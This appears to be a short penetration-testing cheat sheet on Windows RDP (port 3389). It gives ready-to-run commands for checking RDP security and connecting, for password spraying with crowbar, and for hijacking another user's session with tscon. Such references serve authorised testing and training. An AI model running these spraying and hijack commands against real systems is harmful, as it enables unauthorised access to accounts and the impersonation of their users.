# windows rdp

% rdp, windows, 3389
#plateform/windows  #target/local  #protocol/rdp #port/3389

## Check the security settings of the RDP service.
```
rdp-sec-check.pl <FQDN/IP>
```

## Log in to the RDP server from Linux.
```
xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>
```

## crowbar - Password spraying on RDP
```
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

## rdesktop - Connect to RDP
```
rdesktop -u admin -p password123 192.168.2.143
```

## tscon - Impersonate user
```
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

## Execute RDP session hijack
```
net start sessionhijack
```
